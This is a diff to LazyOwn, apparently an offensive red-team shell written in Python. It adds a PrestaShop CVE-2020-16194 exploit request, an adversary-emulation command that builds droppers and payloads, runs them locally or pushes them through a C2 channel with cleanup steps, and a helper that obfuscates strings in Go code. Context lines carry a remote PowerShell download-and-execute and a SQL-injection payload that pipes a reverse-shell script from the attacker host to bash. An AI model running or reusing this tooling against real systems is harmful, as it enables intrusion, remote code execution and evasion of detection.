@@ -99,6 +99,7 @@ class LazyOwnShell(cmd2.Cmd):
         "available_filter_functions_addrs": "sh sudo cat /sys/kernel/tracing/available_filter_functions_addrs",
         "available_filter_functions_addrs_debug": "sh sudo cat /sys/debug/kernel/tracing/available_filter_functions_addrs",
         "amnesiac": "sh pwsh -Command \"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac\"",
+        "atomic_update":"sh cd external/.exploit/atomic-red-team && git pull",
         "auto": "pyautomate",
         "aslr": "run lazyaslrcheck",
         "asm": "sh /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb",
@@ -5892,7 +5893,8 @@ class LazyOwnShell(cmd2.Cmd):
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
-            ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b ")
+            ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b "),
+            ("WEB Prestashop CVE-2020-16194", f"curl -s -k -X $'POST' --data-binary $'opart_devis_customer_id=-1&delivery_address=1&invoice_address=0&opart_devis_carrier_input=1&selected_carrier=0' $'http://{rhost}/index.php?fc=module&module=opartdevis&controller=createquotation&change_carrier_cart' ")
         ]
         
         filtered_commands = [(alias, cmd) for alias, cmd in commands_list if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else commands_list
@@ -10170,6 +10172,7 @@ class LazyOwnShell(cmd2.Cmd):
         server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
         with open(f"{path}/sessions/key.aes", 'rb') as f:
             AES_KEY = f.read()
+
         with open(f"{path}/sessions/mrhyde.c", 'w+') as f:
             f.write(rootkit_content)
         with open(f"{path}/sessions/mrhydew.c", 'w+') as f:
@@ -21930,7 +21933,9 @@ class LazyOwnShell(cmd2.Cmd):
             ("Binary download", "https://bin.ajam.dev/"),
             ("cryptpad","https://cryptpad.fr/"),
             ("kycnot","https://kycnot.me/"),
-            ("socks proxy list","https://spys.one/en/socks-proxy-list/")
+            ("socks proxy list","https://spys.one/en/socks-proxy-list/"),
+            ("Config ntlm2 BurpSuit", "https://portswigger.net/support/configuring-ntlm-with-burp-suite")
+
 
 
 
@@ -24455,6 +24460,200 @@ class LazyOwnShell(cmd2.Cmd):
         if not line:
             line = input("    [!] Enter the client_id (default: no_priv): ") or 'no_priv'
         self.c2_clientid = line.strip()
+
+
+    def do_adversary(self, line):
+        """
+        LazyOwn RedTeam Adversary Emulator, you can configure your own adversaries in adversary.json
+
+        Parameters:
+            line (str): The command line input, 
+            first argument optional is the id of Adversary, 
+            the second optional argument is if the adversary run locally (l), remote (r), or doesn't run (n)
+        
+        Example: adversary 1 r
+        
+        Returns:
+            None
+        """
+        print(len(line))
+        c2_port = self.params["c2_port"]
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        USER = self.params["c2_user"]
+        PASS = self.params["c2_pass"]
+        maleable = self.params["c2_maleable_route"]
+        path = self.path
+        adversaries = load_adversary()
+
+        with open(f"{path}/sessions/key.aes", 'rb') as f:
+            AES_KEY = f.read()
+
+        AES_KEY_hex = AES_KEY.hex()
+        if not line:
+            print("Available adversaries:")
+            for adv in adversaries:
+                print(f"    [{adv.id}] {adv.name}: {adv.description}")
+
+            id_adversary = input("    [!] Enter the id of the adversary: ")
+        else:
+            if len(line) == 3:
+                args = line.split(" ")
+                id_adversary = args[0]
+                confirm = args[1]
+            elif len(line) == 1:
+                confirm = None
+                id_adversary = line.strip()
+            
+        adversary = next((adv for adv in adversaries if adv.id == int(id_adversary)), None)
+
+        if adversary:
+            replacements = {
+                "output_path": adversary.output_path,
+                "binary": adversary.binary,
+                "path_src": adversary.path_src,
+                "name": adversary.name,
+                "target_path": adversary.target_path,
+                "pid": adversary.pid,
+                "param": adversary.param,
+                "shellcode": adversary.shellcode,
+                "lhost": lhost
+            }
+            command = replace_placeholders(adversary.command, replacements)
+            if adversary.encoder == "base64":
+                base64_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
+                replacements["base64_command"] = base64_command
+
+            if adversary.target_os == 'linux':
+                user_agent = self.params["user_agent_lin"]
+            elif adversary.target_os == 'windows':    
+                user_agent = self.params["user_agent_win"]
+
+
+            compile_command = replace_placeholders(adversary.compile, replacements)
+            droper_command = replace_placeholders(adversary.droper, replacements)
+            payload = replace_placeholders(adversary.payload, replacements)
+            clean_cmd = replace_placeholders(adversary.clean_cmd, replacements)
+            copy_command = replace_placeholders(adversary.copy_command, replacements)
+            replace_command = replace_placeholders(adversary.replace_command, replacements)
+            replace_command = replace_command.replace("[shellcode]","{shellcode}")
+            
+            if adversary.id == 5:
+                print_warn(f"{path}/{adversary.output_path}/{adversary.name}")
+                with open(f"{path}/{adversary.output_path}/{adversary.name}", 'r') as f:
+                    content = f.read()
+                    content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", adversary.target_os).replace("{sleep}", str(adversary.sleep)).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
+
+                with open(f"{path}/{adversary.output_path}/{adversary.name}", 'w+') as f:
+                    f.write(content)
+
+
+            print_msg(f"Id: {adversary.id}")
+            print_msg(f"Name: {adversary.name}")
+            print_msg(f"Description: {adversary.description}")
+            print_msg(f"Technique name: {adversary.technique_name}")
+            print_msg(f"Target os: {adversary.target_os}")
+            print_msg(f"Executer: {adversary.executer}")
+            print_msg(f"Lang: {adversary.lang}")
+            print_msg(f"Compile Command: {compile_command}")
+            print_msg(f"Droper Command: {droper_command}")
+            print_msg(f"Plantext Command: {command}")
+            print_msg(f"Encoded Command: {base64_command}")
+            print_msg(f"Payload Command: {payload}")
+            print_msg(f"Clean Command: {clean_cmd}")
+
+            local_stack = [copy_command, replace_command, compile_command]
+            remote_stack = [droper_command, payload, clean_cmd]
+
+            for lstack in local_stack:
+                self.cmd(lstack)
+            if not confirm:
+                confirm = input(f"   [?] Do you want to execute the stack: ? l to local, r to remote, or n to no exec (l/r/n): ").strip().lower() or 'n'
+
+            for command in remote_stack:
+                if confirm == 'l':
+                    print_warn(f"Executing command: {command}")
+                    subprocess.run(command + " 2>/dev/null", shell=True)
+
+                    command_clipboard = subprocess.Popen(
+                        ['xclip', '-selection', 'clipboard'],
+                        stdin=subprocess.PIPE
+                    )
+                    command_clipboard.communicate(input=command.encode())
+                    print_msg(f"Command copied to clipboard: {command}")
+                elif confirm == 'r':
+                    print_warn(f"Executing command: {command}")
+                    user = self.c2_clientid
+                    self.issue_command_to_c2(command, user)
+                    command_clipboard = subprocess.Popen(
+                        ['xclip', '-selection', 'clipboard'],
+                        stdin=subprocess.PIPE
+                    )
+                    command_clipboard.communicate(input=command.encode())
+                    print_msg(f"Command copied to clipboard: {command}")
+                else:
+                    print_warn("Command execution cancelled.")
+                    command_clipboard = subprocess.Popen(
+                        ['xclip', '-selection', 'clipboard'],
+                        stdin=subprocess.PIPE
+                    )
+                    command_clipboard.communicate(input=command.encode())
+                    print_msg(f"Command copied to clipboard: {command}")
+                time.sleep(int(adversary.sleep))
+        else:
+            print(f"No adversary found with id {line}")
+
+    def do_ofuscate_string(self, line):
+        """Ofuscate a string into Go code."""
+        
+        from rich import print
+        from rich.syntax import Syntax        
+
+        parser = argparse.ArgumentParser(description="Ofuscate a string into Go code.")
+        parser.add_argument('variable_name', type=str, help='The name of the variable in Go code.')
+        parser.add_argument('string_to_ofuscate', nargs='+', help='The string to ofuscate.')
+
+        try:
+            args = parser.parse_args(line.split())
+        except SystemExit:
+            variable_name = input("Enter the variable name: ")
+            string_to_ofuscate = input("Enter the string to ofuscate: ")
+        else:
+            variable_name = args.variable_name
+            string_to_ofuscate = " ".join(args.string_to_ofuscate)
+
+        ofuscated_string = " + ".join([f"'{char}'" for char in string_to_ofuscate])
+
+        max_line_length = 80
+        current_line = f"{variable_name} := "
+        current_length = len(current_line)
+        go_code_lines = [current_line]
+
+        for part in ofuscated_string.split(" + "):
+            if current_length + len(part) + 3 > max_line_length:
+                go_code_lines.append("    + " + part)
+                current_length = len(part) + 5
+            else:
+                if len(go_code_lines[-1]) > len(current_line):
+                    go_code_lines[-1] += " + " + part
+                else:
+                    go_code_lines[-1] += part
+                current_length += len(part) + 3
+
+        go_code = "\n".join(go_code_lines).replace("''", "' + '")
+
+        print(Syntax(go_code, "go", theme="monokai", line_numbers=True))
+
+
+    def get_available_actions(self):
+        """Devuelve una lista de acciones disponibles usando introspección de cmd2."""
+        # Usa get_all_commands() para obtener todos los comandos definidos como do_*
+        return self.get_all_commands()
+    
+    def do_get_avaible_actions(self, line):
+        """Get list de supported acctions."""
+        actions = self.get_available_actions()
+        print_msg(actions)
 
 if __name__ == "__main__":
     p = LazyOwnShell()
